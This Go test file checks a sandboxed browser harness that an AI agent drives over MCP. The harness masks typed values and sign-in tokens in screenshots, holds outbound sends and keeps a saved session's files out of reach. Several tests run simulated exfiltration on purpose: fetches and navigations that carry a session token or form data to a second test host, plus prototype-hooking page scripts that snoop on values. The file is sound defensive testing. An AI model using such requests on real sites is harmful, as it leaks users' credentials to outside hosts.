	if json.Unmarshal([]byte(result(t, abox)), &arects) != nil || len(arects) != 2 {
		t.Fatalf("boxes: %s", abox)
	}
	run(reed.PersonJS, nil)
	for i, field := range arects {
		run(reed.ClickJS(int(field.X+5), int(field.Y+5)))
		time.Sleep(reed.PersonWindow + 500*time.Millisecond)
		held = heldTotal()
		keys := strings.Split("12 Typed Street", "")
		if i == 1 {
			keys = []string{"a", "Enter", "b"}
		}
		for _, k := range keys {
			run(reed.KeyJS(k))
		}
		run(`async (page) => page.evaluate(() => fetch("/password/submit", { method: "POST", body: new URLSearchParams({ email: "keys@example.org" }) }).then(() => "sent", () => "held"))`, nil)
		if n := heldTotal(); n != held+1 {
			t.Errorf("a send while typing %q: held %d then %d", keys, held, n)
		}
	}
	// A form in an <object> or an <embed>: its field is read as in an
	// iframe (review 52, round 8).
	for _, tag := range []string{"object", "embed"} {
		call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
		run(`async (page) => { await page.evaluate((tag) => { const o = document.createElement(tag); o.type = "text/html"; o[tag === "object" ? "data" : "src"] = "/iframe/frame.html"; o.style.cssText = "width:400px;height:200px"; document.body.append(o); }, `+"`"+tag+"`"+`); await page.waitForTimeout(1000); const f = page.frames().find((f) => f.url().endsWith("/iframe/frame.html")); await f.locator("input[name=email]").focus(); return "focused"; }`, nil)
		for _, k := range strings.Split("obj@example.org", "") {
			run(reed.KeyJS(k))
		}
		if out := run(reed.KeyJS("End")); !strings.Contains(out, "obj@example.org") {
			t.Errorf("a field in an <%s>: %s", tag, out)
		}
	}
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
	// Space on a button presses it, and marks nothing (review 52, round 4).
	run(`async (page) => { await page.getByRole("button", { name: "Sign in and save" }).focus(); return "focused"; }`, nil)
	if out := run(reed.KeyJS(" ")); !strings.Contains(out, `"before": null`) && !strings.Contains(out, `"before":null`) {
		t.Errorf("Space on a button: %s", out)
	}
	if out := run(`async (page) => String(await page.locator("[data-heedle-typed]").count() > 0 && await page.getByRole("button", { name: "Sign in and save" }).getAttribute("data-heedle-typed") !== null)`, nil); strings.Contains(out, "true") {
		t.Error("Space marked the button as typed into")
	}
	run(reed.PersonDoneJS, nil)
	if _, err := reed.ClickJS(reed.Width, 0); err == nil {
		t.Error("a click off the page")
	}
}

// spyJS replaces, in every frame of the page, the String, RegExp and Array
// methods a matcher would use with ones that note everything they're
// given; spiedJS answers what they noted. A page can do the same, so no
// value to mask may ever reach them (review 52).
const (
	spyJS = `async (page) => { for (const f of page.frames()) await f.evaluate(() => {
  window.__seen = []; let busy = false;
  const apply = Reflect.apply, S = String;
  const spy = (proto, name) => { const o = proto[name]; proto[name] = function (...a) { if (!busy) { busy = true; try { window.__seen.push(S(this)); for (const x of a) window.__seen.push(S(x)); } catch {} busy = false; } return apply(o, this, a); }; };
  for (const n of ["includes", "indexOf", "toLowerCase", "replace", "replaceAll", "match", "matchAll", "startsWith", "endsWith", "slice", "split", "normalize", "search", "trim"]) spy(String.prototype, n);
  for (const n of ["test", "exec"]) spy(RegExp.prototype, n);
  for (const n of ["some", "includes", "indexOf", "map", "filter", "join", "find", "every", "forEach"]) spy(Array.prototype, n);
  for (const n of ["localeCompare", "codePointAt", "charAt", "at", "concat", "padStart"]) spy(String.prototype, n);
  spy(Set.prototype, "has"); spy(Function.prototype, "call"); spy(Function.prototype, "apply");
}); return "spying"; }`
	spiedJS = `async (page) => { const all = []; for (const f of page.frames()) all.push(await f.evaluate(() => (window.__seen || []).join("\n")).catch(() => "")); return all.join("\n"); }`
)

// unseen fails t if the page's spies (spyJS) saw any of values, as given
// or as letters and digits.
func unseen(t *testing.T, seen string, values ...string) {
	t.Helper()
	low := strings.ToLower(seen)
	for _, v := range values {
		n := strings.Map(func(r rune) rune {
			if unicode.IsLetter(r) || unicode.IsDigit(r) {
				return unicode.ToLower(r)
			}
			return -1
		}, v)
		if strings.Contains(low, strings.ToLower(v)) || strings.Contains(low, n) {
			t.Errorf("the page's own script saw %q", v)
		}
	}
}

// TestContainer_ActMasksAcrossSites: a person types in a form framed from
// another site (a frame in a process of its own): the field is marked and
// read, a typo fixed there too, and the field and the page's echo of it
// are masked, matched where the page's own script can't see the values
// (review 52, round 3).
func TestContainer_ActMasksAcrossSites(t *testing.T) {
	img := testActBrowser(t)
	network, check, _ := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/iframe/", Allow: []string{"other-srv"}})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	run := func(code string, err error) string {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
		if isErr {
			t.Fatalf("%.80s: %.600s", code, out)
		}
		return out
	}
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/iframe/"})
	if where := run(`async (page) => { await page.evaluate(() => { document.querySelector("iframe").src = "http://other-srv:8080/iframe/frame.html"; }); await page.waitForTimeout(1500); const f = page.frames().find((f) => f.url().startsWith("http://other-srv")); if (!f) throw new Error("no frame from the other site"); try { await (await page.context().newCDPSession(f)).detach(); return "in a process of its own"; } catch { return "in the page's process"; } }`, nil); !strings.Contains(where, "in a process of its own") {
		t.Fatalf("the other site's frame: %s", where)
	}
	// Scaled down, as a page may show it (review 52, round 5).
	run(`async (page) => { await page.evaluate(() => { const f = document.querySelector("iframe"); f.style.transform = "scale(0.8)"; f.style.transformOrigin = "0 0"; }); return "scaled"; }`, nil)
	// framed is where an element of the frame shows on the page, scaled.
	framed := func(locate string) string {
		return `async (page) => { const f = page.frames().find((f) => f !== page.mainFrame()); const b = await f.locator(` + locate + `).first().evaluate((e) => { const r = e.getBoundingClientRect(); return [r.x, r.y, r.width, r.height]; }); const o = await page.evaluate(() => { const i = document.querySelector("iframe"), r = i.getBoundingClientRect(); return [r.x, r.y, i.clientLeft]; }); return JSON.stringify({ X: o[0] + (o[2] + b[0]) * 0.8, Y: o[1] + (o[2] + b[1]) * 0.8, Width: b[2] * 0.8, Height: b[3] * 0.8 }); }`
	}
	box := run(framed(`"input[name=email]"`), nil)
	var r struct{ X, Y, Width, Height float64 }
	if json.Unmarshal([]byte(result(t, box)), &r) != nil || r.Width == 0 {
		t.Fatalf("box: %s", box)
	}
	run(reed.PersonJS, nil)
	run(reed.ClickJS(int(r.X+5), int(r.Y+5)))
	for _, k := range append(strings.Split("ada@example.og", ""), "ArrowLeft", "r") {
		run(reed.KeyJS(k))
	}
	if out := run(reed.KeyJS("End")); !strings.Contains(out, "ada@example.org") {
		t.Errorf("the field's value, across sites: %s", out)
	}
	if typed := run(reed.TypedJS, nil); !strings.Contains(typed, `"ada@example.org"`) {
		t.Errorf("typed across sites: %s", typed)
	}
	// Text overflowing a narrow element shows what was typed beyond the
	// element's box (review 52, round 5).
	spill := run(`async (page) => { await page.evaluate(() => { const s = document.createElement("span"); s.id = "spill"; s.style.cssText = "display:inline-block;width:80px;white-space:nowrap;font:24px sans-serif"; s.textContent = "Signed in as ada@example.org"; document.body.prepend(s); }); return JSON.stringify(await page.evaluate(() => { const r = document.createRange(); r.selectNodeContents(document.getElementById("spill")); const b = r.getBoundingClientRect(); return { X: b.x + 100, Y: b.y, Width: b.width - 100, Height: b.height }; })); }`, nil)
	var sp struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, spill)), &sp)
	var echo string
	run(`async (page) => { const f = page.frames().find((f) => f.url().startsWith("http://other-srv")); await f.evaluate(() => { const p = document.createElement("p"); p.style.font = "24px sans-serif"; p.textContent = "Signed in as ada@example.org"; document.body.prepend(p); }); return "shown"; }`, nil)
	echo = run(framed(`"p"`), nil)
	var e struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, echo)), &e)
	box = run(framed(`"input[name=email]"`), nil)
	json.Unmarshal([]byte(result(t, box)), &r)
	run(spyJS, nil)
	pic, err := shotOf(run(reed.ShotJSFor(0), nil))
	if err != nil {
		t.Fatal(err)
	}
	unseen(t, result(t, run(spiedJS, nil)), "ada@example.org")
	masked := func(r struct{ X, Y, Width, Height float64 }) float64 {
		in, all := 0, 0
		for y := int(r.Y) + 2; y < int(r.Y+r.Height)-2; y++ {
			for x := int(r.X) + 2; x < int(r.X+r.Width)-2; x++ {
				c := color.RGBAModel.Convert(pic.At(x, y)).(color.RGBA)
				all++
				if near(c.R, 0x5b) && near(c.G, 0x5f) && near(c.B, 0x6b) {
					in++
				}
			}
		}
		return float64(in) / float64(max(all, 1))
	}
	if f, m, o := masked(r), masked(e), masked(sp); f < 0.9 || m < 0.9 || o < 0.9 {
		t.Errorf("masked across sites: the field %.2f, the echo %.2f, the text spilling out %.2f", f, m, o)
	}
	// A frame that can't be reached gives no frame at all: one whose
	// DevTools session fails, and one wrongly passed over as in the page's
	// process (review 52, round 6).
	for _, how := range []string{"boom", "This frame does not have a separate CDP session"} {
		run(`async (page) => { const ctx = page.context(); ctx.__heedleWorlds = null; ctx.__heedleOrig = ctx.__heedleOrig || ctx.newCDPSession.bind(ctx); ctx.newCDPSession = async (t) => { if (t !== page && t.url && t.url().startsWith("http://other-srv")) throw new Error(`+"`"+how+"`"+`); return ctx.__heedleOrig(t); }; return "broken"; }`, nil)
		if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(0)}); !isErr {
			t.Errorf("a frame taken with the other site's frame unreachable (%s): %.200s", how, out)
		}
	}
	run(`async (page) => { const ctx = page.context(); ctx.newCDPSession = ctx.__heedleOrig; ctx.__heedleWorlds = null; return "mended"; }`, nil)
	// The frame moves to this site's process (a sign-in going back, say):
	// the person keeps typing, and frames are still taken (review 52,
	// round 5: the dead session locked them out).
	run(`async (page) => { await page.evaluate(() => { document.querySelector("iframe").src = "http://forms-srv:8080/iframe/frame.html"; }); await page.waitForTimeout(1500); return "moved"; }`, nil)
	box = run(framed(`"input[name=email]"`), nil)
	json.Unmarshal([]byte(result(t, box)), &r)
	run(reed.ClickJS(int(r.X+5), int(r.Y+5)))
	for _, k := range strings.Split("grace@example.org", "") {
		run(reed.KeyJS(k))
	}
	if out := run(reed.KeyJS("End")); !strings.Contains(out, "grace@example.org") {
		t.Errorf("typing after the frame moved: %s", out)
	}
	if pic, err = shotOf(run(reed.ShotJSFor(0), nil)); err != nil {
		t.Fatal(err)
	}
	if f := masked(r); f < 0.9 {
		t.Errorf("after the frame moved, the field masked %.2f", f)
	}
	run(reed.PersonDoneJS, nil)
	// A hidden frame from another site: frames are still taken, its
	// unshown content boxed nowhere (review 52, round 6).
	run(`async (page) => { await page.evaluate(() => { const i = document.createElement("iframe"); i.style.display = "none"; i.src = "http://other-srv:8080/iframe/frame.html"; document.body.append(i); }); await page.waitForTimeout(1500); return "hidden"; }`, nil)
	if _, err := shotOf(run(reed.ShotJSFor(0), nil)); err != nil {
		t.Errorf("with a hidden frame from another site: %v", err)
	}
	// Frames coming and going every 100 ms: every key the person types
	// arrives and is read (review 52, round 6).
	run(`async (page) => { await page.evaluate(() => { setInterval(() => { const i = document.createElement("iframe"); i.src = "http://other-srv:8080/iframe/frame.html"; i.style.width = "10px"; document.body.append(i); setTimeout(() => i.remove(), 100); }, 100); }); return "churning"; }`, nil)
	// Nothing focused: keys that don't edit, and the first click into
	// the field, still arrive (review 52, round 7).
	run(`async (page) => { for (const f of page.frames()) await f.evaluate(() => document.activeElement && document.activeElement.blur()).catch(() => {}); return "blurred"; }`, nil)
	for _, k := range []string{"PageDown", "Escape", "Tab", "Shift+Tab"} {
		if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": mustKey(t, k)}); isErr {
			t.Errorf("%s with nothing focused, frames coming and going: %.300s", k, out)
		}
	}
	run(`async (page) => { for (const f of page.frames()) await f.evaluate(() => document.activeElement && document.activeElement.blur()).catch(() => {}); return "blurred"; }`, nil)
	for range 5 {
		if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": mustClick(t, int(r.X+5), int(r.Y+5))}); isErr {
			t.Fatalf("a click into the field, frames coming and going: %.300s", out)
		}
	}
	run(`async (page) => { const f = page.frames().find((f) => f.url().startsWith("http://forms-srv:8080/iframe/frame")); await f.locator("input[name=email]").fill(""); return "cleared"; }`, nil)
	for _, k := range strings.Split("churn@example.org", "") {
		if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": mustKey(t, k)}); isErr {
			t.Fatalf("%q lost while frames came and went: %.300s", k, out)
		}
	}
	if out := run(reed.KeyJS("End")); !strings.Contains(out, "churn@example.org") {
		t.Errorf("typed while frames came and went: %s", out)
	}
	run(`async (page) => { await page.evaluate(() => { for (let i = 1; i < 1e5; i++) clearInterval(i); document.querySelectorAll("iframe[style*='10px']").forEach((i) => i.remove()); }); await page.waitForTimeout(300); return "still"; }`, nil)
	// The hold, in a frame from another site in a process of its own: its
	// fetch, its form and its WebSocket message are all held (review 52,
	// round 5: --site-per-process).
	run(`async (page) => { await page.evaluate(() => { document.querySelector("iframe").src = "http://other-srv:8080/iframe/frame.html"; }); await page.waitForTimeout(1500); return "back"; }`, nil)
	heldTotal := func() int {
		var h struct{ Total int }
		out := run(reed.HeldJS, nil)
		if i := strings.IndexByte(out, '{'); i < 0 || json.NewDecoder(strings.NewReader(out[i:])).Decode(&h) != nil {
			t.Fatalf("held: %s", out)
		}
		return h.Total
	}
	// Focus in the other site's frame, which can't be reached (passed over
	// as in the page's process): a key that edits isn't pressed (review 52,
	// round 8).
	run(`async (page) => { const f = page.frames().find((f) => f.url().startsWith("http://other-srv")); await f.locator("input[name=email]").fill(""); await f.locator("input[name=email]").focus(); const ctx = page.context(); ctx.__heedleWorlds = null; ctx.__heedleOrig = ctx.__heedleOrig || ctx.newCDPSession.bind(ctx); ctx.newCDPSession = async (t) => { if (t !== page && t.url && t.url().startsWith("http://other-srv")) throw new Error("This frame does not have a separate CDP session"); return ctx.__heedleOrig(t); }; return "unreachable"; }`, nil)
	if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": mustKey(t, "a")}); !isErr {
		t.Errorf("a key pressed in a frame that couldn't be read: %.200s", out)
	}
	if out := run(`async (page) => { const ctx = page.context(); ctx.newCDPSession = ctx.__heedleOrig; ctx.__heedleWorlds = null; return JSON.stringify(await page.frames().find((f) => f.url().startsWith("http://other-srv")).locator("input[name=email]").inputValue()); }`, nil); !strings.Contains(out, `\"\"`) {
		t.Errorf("the key went in: %s", out)
	}
	held := heldTotal()
	run(`async (page) => { const f = page.frames().find((f) => f.url().startsWith("http://other-srv")); await (await page.context().newCDPSession(f)).detach();
  await f.evaluate(() => fetch("/iframe/submit", { method: "POST", body: new URLSearchParams({ email: "fetch@example.org", frequency: "weekly" }) }).catch(() => 0));
  await f.evaluate(() => new Promise((r) => { const w = new WebSocket("ws://other-srv:8080/ws/iframe"); w.onopen = () => { w.send("frame"); setTimeout(() => r(1), 300); }; w.onerror = () => r(0); setTimeout(() => r(0), 3000); }));
  await f.evaluate(() => { const fm = document.querySelector("form"); fm.querySelector("input[name=email]").value = "form@example.org"; fm.submit(); });
  await page.waitForTimeout(1500); return "sent"; }`, nil)
	if n, got := heldTotal(), check("iframe").Received; n != held+3 || len(got) != 0 {
		t.Errorf("sends from another site's frame: held %d then %d; received %v", held, n, got)
	}
}

// shotOf is the frame a ShotJSFor call answered, its masks painted.
func shotOf(answer string) (image.Image, error) {
	b, err := reed.ShotOf(answer)
	if err != nil {
		return nil, err
	}
	return jpeg.Decode(bytes.NewReader(b))
}

// mustKey is reed.KeyJS(k), which must be a key.
func mustKey(t *testing.T, k string) string {
	t.Helper()
	js, err := reed.KeyJS(k)
	if err != nil {
		t.Fatal(err)
	}
	return js
}

// mustClick is reed.ClickJS(x, y), which must be on the page.
func mustClick(t *testing.T, x, y int) string {
	t.Helper()
	js, err := reed.ClickJS(x, y)
	if err != nil {
		t.Fatal(err)
	}
	return js
}

// TestContainer_ActStartsSignedIn: a session given a saved sign-in
// (UseStorage) starts signed in on its site; once the context has it, its
// file is gone from the container, and the browser can't open it; what it
// holds is held wherever a request carries it, and a GET with a query to
// a host not signed in is held (roadmap 9.11, review 53).
func TestContainer_ActStartsSignedIn(t *testing.T) {
	img := testActBrowser(t)
	network, check, _ := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/whoami/password", Allow: []string{"other-srv"}})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	state := `{"cookies":[{"name":"course-password","value":"member-t0ken","domain":"forms-srv","path":"/","expires":-1,"httpOnly":true,"secure":false,"sameSite":"Lax"}],"origins":[]}`
	if err := s.UseStorage(ctx, []byte(state), []string{"forms-srv"}); err != nil {
		t.Fatal(err)
	}
	cs := mcpSession(t, s)
	run := func(code string) string {
		t.Helper()
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
		if isErr {
			t.Fatalf("%.80s: %.400s", code, out)
		}
		return out
	}
	if out := run(reed.StartedJS); !strings.Contains(out, "started") {
		t.Fatalf("started: %s", out)
	}
	if err := s.DropStorage(ctx); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command("podman", "exec", s.Name(), reed.ActNode, "-e", "console.log(require('fs').readdirSync(process.argv[1]).join(' '))", reed.ActHoldDir).CombinedOutput(); err != nil || strings.Contains(string(out), "storage.json") || strings.Contains(string(out), "signed-in.json") {
		t.Errorf("the sign-in's files are still there: %v %s", err, out)
	}
	for _, f := range []string{reed.ActStorage, reed.ActSignedIn} {
		if out, _ := call(t, cs, "browser_navigate", map[string]any{"url": "file://" + f}); strings.Contains(out, "member-") {
			t.Errorf("the browser read %s: %.300s", f, out)
		}
	}
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/whoami/password"})
	if snap, _ := call(t, cs, "browser_snapshot", nil); !strings.Contains(snap, "Signed in as a course member") {
		t.Errorf("not signed in:\n%s", snap)
	}
	heldTotal := func() int {
		var h struct{ Total int }
		out := run(reed.HeldJS)
		if i := strings.IndexByte(out, '{'); i < 0 || json.NewDecoder(strings.NewReader(out[i:])).Decode(&h) != nil {
			t.Fatalf("held: %s", out)
		}
		return h.Total
	}
	held := heldTotal()
	run(`async (page) => { await page.evaluate(() => Promise.all([fetch("http://forms-srv:8080/contact/?t=member-t0ken").catch(() => 0), fetch("http://other-srv:8080/contact/?d=anything").catch(() => 0), fetch("http://other-srv:8080/contact/").catch(() => 0)])); return "sent"; }`)
	if n := heldTotal(); n != held+2 {
		t.Errorf("a GET carrying the sign-in, and a GET with a query to a host not signed in: held %d then %d", held, n)
	}
	if got := check("contact").Received; len(got) != 0 {
		t.Errorf("received: %v", got)
	}
	// The page going to a host not signed in, with no query, is held too
	// (review 53, round 2).
	held = heldTotal()
	call(t, cs, "browser_navigate", map[string]any{"url": "http://other-srv:8080/contact/member-t0ken"})
	if n := heldTotal(); n != held+1 {
		t.Errorf("going to a host not signed in: held %d then %d", held, n)
	}
	// A page showing what the sign-in holds is masked in frames, and what
	// a person typed (TypedJS) isn't mistaken for it (review 53, round 2).
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/whoami/password"})
	box := run(`async (page) => { await page.evaluate(() => { const p = document.createElement("p"); p.style.font = "28px sans-serif"; p.textContent = "Your token: member-t0ken"; document.body.prepend(p); }); return JSON.stringify(await page.getByText("Your token").boundingBox()); }`)
	var r struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, box)), &r)
	pic, err := shotOf(run(reed.ShotJSFor(0)))
	if err != nil {
		t.Fatal(err)
	}
	in, all := 0, 0
	for y := int(r.Y) + 2; y < int(r.Y+r.Height)-2; y++ {
		for x := int(r.X) + 2; x < int(r.X+r.Width)-2; x++ {
			c := color.RGBAModel.Convert(pic.At(x, y)).(color.RGBA)
			all++
			if near(c.R, 0x5b) && near(c.G, 0x5f) && near(c.B, 0x6b) {
				in++
			}
		}
	}
	if m := float64(in) / float64(max(all, 1)); m < 0.9 {
		t.Errorf("the sign-in's value shown on the page: masked %.2f", m)
	}
	if typed := run(reed.TypedJS); strings.Contains(typed, "member-") {
		t.Errorf("what was typed holds the sign-in: %s", typed)
	}
}
